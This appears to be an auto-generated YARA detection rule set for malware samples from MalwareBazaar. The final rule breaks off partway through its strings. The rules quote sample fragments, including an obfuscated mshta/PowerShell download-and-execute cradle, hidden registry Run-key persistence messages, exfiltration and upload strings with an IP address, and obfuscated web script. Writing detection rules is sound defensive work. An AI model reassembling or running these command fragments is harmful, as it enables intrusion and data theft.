/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-14
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule sig_03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af {
   meta:
      description = "evidences - file 03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af"
   strings:
      $x1 = "Foreign key referencing Component that controls the file.FileNameFilenameFile name used for installation, may be localized.  Thi" ascii
      $x2 = "ease install the .NET Framework then run this installer again.REMOVE OR NOT NEW_VERSIONInstallation cannot continue. There is a " ascii
      $x3 = "ERS]\"SchedServiceConfigExecServiceConfigRollbackServiceConfigProgramFilesFolderTBDTARGETDIR.SourceDirFulldbbvsztr.dll|ScreenCon" ascii
      $x4 = "C:\\Users\\jmorgan\\Source\\cwcontrol\\Custom\\DotNetRunner\\DotNetResolver\\obj\\Debug\\DotNetResolver.pdb" fullword ascii
      $x5 = "C:\\Users\\jmorgan\\Source\\cwcontrol\\Custom\\DotNetRunner\\Release\\DotNetRunner.pdb" fullword ascii
      $x6 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */
      $x7 = "\\\\.\\Pipe\\TerminalServer\\SystemExecSrvr\\" fullword wide
      $s8 = "failed to get WixShellExecBinaryId" fullword ascii
      $s9 = "un if failure action is RUN_COMMAND.RebootMessageMessage to show to users when rebooting if failure action is REBOOT.ServiceCont" ascii
      $s10 = "TerminateProcessesProcessExecutablePathsToTerminate=[INSTALLLOCATION]ScreenConnect.WindowsBackstageShell.exe,[INSTALLLOCATION]Sc" ascii
      $s11 = "Specify your proxy server and optional credentials. These values will be preferred when connecting to your session. However, oth" ascii
      $s12 = "failed to process target from CustomActionData" fullword ascii
      $s13 = "failed to get handle to kernel32.dll" fullword ascii
      $s14 = "CommandStoreLoginCredentials" fullword wide
      $s15 = "XSystem.Byte, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
      $s16 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s17 = "ZSystem.UInt32, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
      $s18 = "XSystem.Char, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 " fullword ascii
      $s19 = "IsCurrentProcessTokenUnelevatedAdministrator" fullword ascii
      $s20 = "YSystem.Int16, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      1 of ($x*) and 4 of them
}

rule a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5 {
   meta:
      description = "evidences - file a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5"
   strings:
      $x1 = "que key identifying the binary data.DataThe unformatted binary data.ComponentPrimary key used to identify a particular component" ascii
      $x2 = "ecKillAteraTaskQuietKillAteraServicesc delete AteraAgentoldVersionUninstallunins000.exe /VERYSILENTinstall/i /IntegratorLogin=\"" ascii
      $x3 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */
      $x4 = "minPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProductNETFRAMEWORK35NetFramework35AlphaControlAgentInst" ascii
      $x5 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\shellexecca.cpp" fullword ascii
      $s6 = "failed to get WixShellExecBinaryId" fullword ascii
      $s7 = "failed to process target from CustomActionData" fullword ascii
      $s8 = "failed to get handle to kernel32.dll" fullword ascii
      $s9 = "AlphaControlAgentInstallation.dll" fullword wide
      $s10 = "oseireli.com.brINTEGRATORLOGINCOMPANYID001Q3000005bkCOIAYACCOUNTID" fullword ascii
      $s11 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\serviceconfig.cpp" fullword ascii
      $s12 = "lrpfxg.exe|AteraAgent.exe1.8.7.207uho0yn3.con|AteraAgent.exe.configfd-i8f6f.dll|ICSharpCode.SharpZipLib.dll1.3.3.11e8lrglzz.dll|" ascii
      $s13 = "NSTALLFOLDERAteraAgent.exe.config{0EC8B23C-C723-41E1-9105-4B9C2CDAD47A}ICSharpCode.SharpZipLib.dll{F1B1B9D1-F1B0-420C-9D93-F04E9" ascii
      $s14 = "AteraAgent.exe" fullword ascii
      $s15 = "failed to get security descriptor's DACL - error code: %d" fullword ascii
      $s16 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii
      $s17 = "failed to get WixShellExecTarget" fullword ascii
      $s18 = "System.ValueTuple.dll" fullword ascii
      $s19 = "DERID]\" /AccountId=\"[ACCOUNTID]\" /AgentId=\"[AGENTID]\"uninstall/uDeleteTaskSchedulerSCHTASKS.EXE /delete /tn \"Monitoring Re" ascii
      $s20 = "failed to schedule ExecServiceConfig action" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79da53e7 {
   meta:
      description = "evidences - file f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79da53e7.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79da53e7"
   strings:
      $s1 = "D:\\a\\cb\\cb\\cb\\bld\\bin\\e_sqlite3\\win\\v142\\plain\\x64\\e_sqlite3.pdb" fullword ascii
      $s2 = "invalid fts5 file format (found %d, expected %d or %d) - run 'rebuild'" fullword ascii
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s4 = "e_sqlite3.dll" fullword ascii
      $s5 = "%s: \"%s\" - should this be a string literal in single-quotes?" fullword ascii
      $s6 = "62626262626262" wide /* hex encoded string 'bbbbbbb' */
      $s7 = "6262626262" wide /* hex encoded string 'bbbbb' */
      $s8 = "6262626262626262626262" wide /* hex encoded string 'bbbbbbbbbbb' */
      $s9 = "fts5: error creating shadow table %q_%s: %s" fullword ascii
      $s10 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii
      $s11 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii
      $s12 = "error in %s %s%s%s: %s" fullword ascii
      $s13 = "SqlExec" fullword ascii
      $s14 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii
      $s15 = "Wrong number of entries in %%%s table - expected %lld, actual %lld" fullword ascii
      $s16 = "MUTEX_W32" fullword ascii
      $s17 = "REINDEXEDESCAPEACHECKEYBEFOREIGNOREGEXPLAINSTEADDATABASELECTABLEFTHENDEFERRABLELSEXCLUDELETEMPORARYISNULLSAVEPOINTERSECTIESNOTNU" ascii
      $s18 = "segdir" fullword ascii /* reversed goodware string 'ridges' */
      $s19 = "%s: table does not support scanning" fullword ascii
      $s20 = "USE TEMP B-TREE FOR %s(ORDER BY)" fullword ascii
   condition:
      uint16(0) == 0x98c4 and filesize < 5000KB and
      8 of them
}

rule sig_1e6608ca1f9cf80c479444e4d2461e3963a4516182d0acbba32cbd794b871153 {
   meta:
      description = "evidences - file 1e6608ca1f9cf80c479444e4d2461e3963a4516182d0acbba32cbd794b871153.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "1e6608ca1f9cf80c479444e4d2461e3963a4516182d0acbba32cbd794b871153"
   strings:
      $x1 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii
      $x2 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii
      $x3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii
      $s4 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii
      $s5 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii
      $s6 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii
      $s7 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii
      $s8 = "FHeaderProcessed" fullword ascii
      $s9 = "OnExecutexAF" fullword ascii
      $s10 = "FExecuteAfterTimestamp" fullword ascii
      $s11 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide
      $s12 = "http://www.digicert.com/CPS0" fullword ascii
      $s13 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii
      $s14 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0" fullword ascii
      $s15 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 " fullword ascii
      $s16 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii
      $s17 = "7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E" fullword ascii
      $s18 = "7VAR and OUT arguments must match parameter type exactly\"%s (Version %d.%d, Build %d, %5:s):%s Service Pack %4:d (Version %1:d." wide
      $s19 = "TComponent.GetObservers$1$Intf" fullword ascii
      $s20 = "AppMutex" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      1 of ($x*) and 4 of them
}

rule sig_7a219a7969ecff7763a92167eff0e138ff4271030fbae4614e60ad06354168e7 {
   meta:
      description = "evidences - file 7a219a7969ecff7763a92167eff0e138ff4271030fbae4614e60ad06354168e7.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "7a219a7969ecff7763a92167eff0e138ff4271030fbae4614e60ad06354168e7"
   strings:
      $x1 = "ws.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></de" ascii
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii
      $s3 = "sembly></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLeve" ascii
      $s4 = "level=\"requireAdministrator\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schem" ascii
      $s5 = "/[bN* -" fullword ascii
      $s6 = "* olKB" fullword ascii
      $s7 = "# -oN*~" fullword ascii
      $s8 = "klsmzkle" fullword ascii
      $s9 = "+-.x:\"" fullword ascii
      $s10 = "vop.Ufj" fullword ascii
      $s11 = "T_Tp:\\" fullword ascii
      $s12 = "|7V:\"=" fullword ascii
      $s13 = "jH:\"BDw" fullword ascii
      $s14 = "!)jw:\"+'" fullword ascii
      $s15 = "L[SL:\\" fullword ascii
      $s16 = "p!RMf:\\" fullword ascii
      $s17 = "JVFQXAZ" fullword ascii
      $s18 = "crosoft-com:compatibility.v1\"><application><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supportedOS Id=\"{e2011" ascii
      $s19 = " Install System v2.46.5-Unicode</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Wi" ascii
      $s20 = "QL&FTP" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      1 of ($x*) and 4 of them
}

rule sig_087b1c2258af2e9e31a4c99a28ca2e08c5b1a7cbd4539be4376fd71e4e73bb85 {
   meta:
      description = "evidences - file 087b1c2258af2e9e31a4c99a28ca2e08c5b1a7cbd4539be4376fd71e4e73bb85.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "087b1c2258af2e9e31a4c99a28ca2e08c5b1a7cbd4539be4376fd71e4e73bb85"
   strings:
      $x1 = "C:\\Users\\ELJoOker\\0xL4ugh2024\\Deep Inside\\x64\\Release\\Deep Inside.pdb" fullword ascii
      $s2 = "libpng16.dll" fullword ascii
      $s3 = "minizip.dll" fullword ascii
      $s4 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii
      $s5 = "\"%s\" -p %d -accepteula \"%s\"" fullword ascii
      $s6 = "%s\\sdelete.exe" fullword ascii
      $s7 = "%s\\Downloads" fullword ascii
      $s8 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s9 = "%s\\Exfiltrated_data.zip" fullword ascii
      $s10 = "%s\\Would you lose.png" fullword ascii
      $s11 = "192.159.112.59" fullword ascii
      $s12 = "  </trustInfo>" fullword ascii
      $s13 = ".rdata$voltmd" fullword ascii
      $s14 = "%s\\Desktop" fullword ascii /* Goodware String - occured 2 times */
      $s15 = "/upload" fullword wide
      $s16 = "      </requestedPrivileges>" fullword ascii
      $s17 = ".CRT$XIAC" fullword ascii /* Goodware String - occured 3 times */
      $s18 = "      <requestedPrivileges>" fullword ascii
      $s19 = "_set_app_type" fullword ascii /* Goodware String - occured 3 times */
      $s20 = "_get_initial_narrow_environment" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule d0f7a44e877b0da6adf627c0a60b4f5253af4b9d488001523c63b28585f0e6cb {
   meta:
      description = "evidences - file d0f7a44e877b0da6adf627c0a60b4f5253af4b9d488001523c63b28585f0e6cb.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "d0f7a44e877b0da6adf627c0a60b4f5253af4b9d488001523c63b28585f0e6cb"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.0-c060 61.134777, 2010/02/" ascii
      $s2 = "http://fs0.gamenet.ru/installers/qgna/aika/live/aika_inner.exe" fullword wide
      $s3 = "PlayAika2.exe" fullword wide
      $s4 = "https://gnlogin.ru/?credentialkey=" fullword ascii
      $s5 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii
      $s6 = "gnapi.com" fullword ascii
      $s7 = "!http://ocsp.globalsign.com/rootr103" fullword ascii
      $s8 = "\"http://ocsp2.globalsign.com/rootr306" fullword ascii
      $s9 = "curity><requestedPrivileges><requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\"></requestedExecutionLevel></r" ascii
      $s10 = "Select * from win32_Processor" fullword wide
      $s11 = ",http://ocsp2.globalsign.com/gscodesignsha2g30V" fullword ascii
      $s12 = "(http://ocsp2.globalsign.com/gscodesigng30V" fullword ascii
      $s13 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/ResourceRef#\" xmlns:xmp=\"http://ns.adobe.com/xa" ascii
      $s14 = "%i.dll" fullword wide
      $s15 = "mhttp://ns.adobe.com/xap/1.0/" fullword ascii
      $s16 = "\"http://crl.globalsign.com/root.crl0Y" fullword ascii
      $s17 = "%http://crl.globalsign.com/root-r3.crl0c" fullword ascii
      $s18 = ".?AVMutexLock@@" fullword ascii
      $s19 = "Installer (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.2914)" fullword ascii
      $s20 = "Select VideoProcessor from Win32_VideoController" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_22d12b8f0a3d85ea31d278488e203ed462bd4f34a5ff0c4030cd819d56c65bab {
   meta:
      description = "evidences - file 22d12b8f0a3d85ea31d278488e203ed462bd4f34a5ff0c4030cd819d56c65bab.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "22d12b8f0a3d85ea31d278488e203ed462bd4f34a5ff0c4030cd819d56c65bab"
   strings:
      $x1 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii
      $x2 = "unsafe.String: len out of rangebad certificate status responsetls: unsupported public key: %TTLS: sequence number wraparoundCLIE" ascii
      $x3 = "compileCallback: float arguments not supportedruntime: name offset base pointer out of rangeruntime: type offset base pointer ou" ascii
      $x4 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bpruntime: double waitws2_32.dll not foundpreempt " ascii
      $x5 = "tls: server resumed a session with a different versiontls: server accepted 0-RTT with the wrong cipher suitetls: certificate use" ascii
      $x6 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii
      $x7 = "runtime.newosprocruntime/internal/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=gp.waiting != nilunknown c" ascii
      $x8 = "invalid indexed representation index %dtransport endpoint is already connectedx509: invalid subject alternative namesx509: inval" ascii
      $x9 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeassignment to entry in nil mapruntime:" ascii
      $x10 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= casfrom_Gscanstatus: gp-" ascii
      $x11 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii
      $x12 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii
      $x13 = "x509: failed to parse URI constraint %q: cannot be IP addressx509: internal error: system verifier returned an empty chainhttp2:" ascii
      $x14 = "crypto/elliptic: nistec rejected normalized scalarx509: missing ASN.1 contents; use ParseCertificatex509: invalid RDNSequence: i" ascii
      $x15 = "on a locked thread with no template threadunexpected signal during runtime executionattempted to trace a bad status for a procsy" ascii
      $x16 = "invalid PrintableStringx509: malformed UTCTimex509: invalid key usagex509: malformed versiontoo many pointers (>10)segment lengt" ascii
      $x17 = "runtime: sp=abi mismatchtlsunsafeekmclose notifyremote errorc hs traffics hs trafficc ap traffics ap trafficMime-VersionX-Imforw" ascii
      $x18 = "abbradiogrouparamainavalueaccept-charsetbodyaccesskeygenobrbasefontimeupdateviacacheightmlabelooptgroupatternoembedetailsampictu" ascii
      $x19 = "stopm spinning nmidlelocked= needspinning=randinit twicestore64 failedsemaRoot queuebad allocCountbad span statestack overflow u" ascii
      $x20 = "context canceled.WithValue(type no renegotiationSignatureScheme(Content-LanguagehostLookupOrder=/etc/resolv.confnon-IPv4 address" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 27000KB and
      1 of ($x*)
}

rule b0c71e2b19b3cde4f32ccf2159ab94beca188ffab5d761f2d610989821c772c3 {
   meta:
      description = "evidences - file b0c71e2b19b3cde4f32ccf2159ab94beca188ffab5d761f2d610989821c772c3.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "b0c71e2b19b3cde4f32ccf2159ab94beca188ffab5d761f2d610989821c772c3"
   strings:
      $s1 = "mshta vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell $L='(New-Object Net.We';$Y='bClient).Downlo';$V='adString(" wide
      $s2 = "[+] SharpHide running as elevated user:" fullword wide
      $s3 = "C:\\Users\\CODE\\Desktop\\SharpHide-master " fullword ascii
      $s4 = "SharpHide.exe" fullword wide
      $s5 = "get_IsElevated" fullword ascii
      $s6 = "[+] Create hidden registry (Run) key:" fullword wide
      $s7 = "[+] Delete hidden registry (Run) key:" fullword wide
      $s8 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s9 = "\\SharpHide-master\\SharpHide\\obj\\Debug\\SharpHide.pdb" fullword ascii
      $s10 = "[+] SharpHide running as normal user:" fullword wide
      $s11 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s12 = "[+] Key successfully deleted." fullword wide
      $s13 = "[+] Key successfully created." fullword wide
      $s14 = ".NETFramework,Version=v4.6.1" fullword ascii
      $s15 = ".NET Framework 4.6.1" fullword ascii
      $s16 = "[!] Failed to delete registry key." fullword wide
      $s17 = "[!] Failed to create registry key." fullword wide
      $s18 = "[+] SharpHide" fullword wide
      $s19 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii
      $s20 = "RegistryKeyType" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      8 of them
}

rule bca747b28cbc1fdaea45449dbffceb139cdab55ae7e0a931f07162139526e976 {
   meta:
      description = "evidences - file bca747b28cbc1fdaea45449dbffceb139cdab55ae7e0a931f07162139526e976.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "bca747b28cbc1fdaea45449dbffceb139cdab55ae7e0a931f07162139526e976"
   strings:
      $s1 = "GET / HTTP/1.1" fullword ascii
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" fullword ascii
      $s3 = "handle_command" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" fullword ascii
      $s5 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017" fullword ascii
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" fullword ascii
      $s9 = "daemonize" fullword ascii
      $s10 = "pthread_create@GLIBC_2.34" fullword ascii
      $s11 = ".note.gnu.build-id" fullword ascii
      $s12 = "threads.0" fullword ascii
      $s13 = "frame_dummy" fullword ascii
      $s14 = "__frame_dummy_init_array_entry" fullword ascii
      $s15 = "completed.0" fullword ascii
      $s16 = "http_attack" fullword ascii
      $s17 = "_IO_stdin_used" fullword ascii
      $s18 = ".note.ABI-tag" fullword ascii
      $s19 = "__FRAME_END__" fullword ascii
      $s20 = "__stack_chk_fail@GLIBC_2.4" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 40KB and
      8 of them
}

rule sig_05fd36fdb90d371b4a4ce8ae48e52e01327043967b7995cdafbc79f03cf38bbf {
   meta:
      description = "evidences - file 05fd36fdb90d371b4a4ce8ae48e52e01327043967b7995cdafbc79f03cf38bbf.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "05fd36fdb90d371b4a4ce8ae48e52e01327043967b7995cdafbc79f03cf38bbf"
   strings:
      $s1 = "yQGQVh:3" fullword ascii
      $s2 = "E4tmPhT" fullword ascii
      $s3 = "D$,9D$," fullword ascii /* Goodware String - occured 1 times */
      $s4 = "D$pQQjXPR" fullword ascii
      $s5 = "D$89L$8" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "T$4XZj" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "D$<9t$<" fullword ascii /* Goodware String - occured 2 times */
      $s8 = "D$, D$" fullword ascii /* Goodware String - occured 2 times */
      $s9 = "\\$(iD$" fullword ascii
      $s10 = "\\$0PPj" fullword ascii
      $s11 = "D$89|$8tB" fullword ascii
      $s12 = "D$0f@t" fullword ascii
      $s13 = ";t$@tK" fullword ascii
      $s14 = "D$(9|$(t>" fullword ascii
      $s15 = "D$x9|$xtB" fullword ascii
      $s16 = "D$4;t$4u" fullword ascii
      $s17 = "^8QShu~" fullword ascii
      $s18 = "|$'ftt" fullword ascii
      $s19 = "|$(f9|$@" fullword ascii
      $s20 = "xAPPSh" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_094436a8a6e5120a8978461a04256bbffbb429b630474efa3113edeeeb055e34 {
   meta:
      description = "evidences - file 094436a8a6e5120a8978461a04256bbffbb429b630474efa3113edeeeb055e34.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "7c5ab58dbdeac005cde1ee56b3dc3badf1acbe2f0368d17ea03e1a4e29ccada4"
   strings:
      $x1 = "<html><head><meta http-equiv='x-ua-compatible' content='EmulateIE9'><META NAME='GENERATOR' Content='The source code of this page" ascii
      $s2 = "<html><head><meta http-equiv='x-ua-compatible' content='EmulateIE9'><META NAME='GENERATOR' Content='The source code of this page" ascii
      $s3 = " is encrypted with HTML Guardian,  the world's standart for website protection. Visit http://www.protware.com for details'><meta" ascii
      $s4 = " http-equiv='expires' content=''><script>l1l=document.documentMode||document.all;var c6efa=true;ll1=document.layers;lll=window.s" ascii
      $s5 = "/~Wgq';owBQQo7vn+=   '%29%3B\\154%31%5B%5F%6C%5D%3Dl%30%5BI%6C%5D%3Bif%28%6C%32%29%7Bli%2B%3D%6C%30%5B%49l%5D%7D%3Bb\\162ea%6B%3" ascii
      $s6 = "                                  </script></head><body></body></html>" fullword ascii
      $s7 = "%3B%61%66%65%36%63%28%29%3B';</script><!--n1AQGkc1Y52zPTIevyKl--><script>                                                       " ascii
      $s8 = "ipt><script>qiaFYEB=new Array();qiaFYEB[0]='oE\\143%36\\163R%33\\166M%6B\\102%31';tRFM1c4=new Array();tRFM1c4[0]='" fullword ascii
      $s9 = "ykMw.kcm\\n" fullword ascii
      $s10 = "idebar;c6efa=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return " ascii
      $s11 = "hiqxkiq" fullword ascii
      $s12 = "udurutuvy" fullword ascii
      $s13 = "lxixkxmxoxq" fullword ascii
      $s14 = ".nKv(n\\\\n^n5nSvSnUnWnY{8n[n%m" fullword ascii
      $s15 = "\\'x3knrxpZkrl\\nt" fullword ascii
      $s16 = "\\154\\145%28%2D%2DI\\154%29%3BIl%3D%31%32%38%3B\\154%31%5B%30%5D%3D\\154i%3D\\154%30%5Bl%37%5B%30%5D%5D%3Bl%6C%3D\\154%37%5B%30" ascii
      $s17 = "elhwza" fullword ascii
      $s18 = "ungmhn" fullword ascii
      $s19 = "4jRkzrLuiqFs" fullword ascii
      $s20 = "tkhkYkk" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_1aa322370adba4527cc14afaeddb9c09729bc0aabeb2dbff2eb5f984d4574a2e {
   meta:
      description = "evidences - file 1aa322370adba4527cc14afaeddb9c09729bc0aabeb2dbff2eb5f984d4574a2e.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "1aa322370adba4527cc14afaeddb9c09729bc0aabeb2dbff2eb5f984d4574a2e"
   strings:
      $x1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s4 = "BAAAAAAAAAAA" ascii /* base64 encoded string '        ' */ /* reversed goodware string 'AAAAAAAAAAAB' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                     ' */
      $s6 = "qVmTiRXO2oESvZFZxBQ/JGtyR2X3/lOgVqlFtP27yx9VtPxbyOrw4it1phSqvjxjrVOyU1Xg2O7KZ7ykGL9kB2iTCl5/1dGVp3d2oNAAqVjN1Q2Zw9ScMRFMVdzc4kjV" ascii
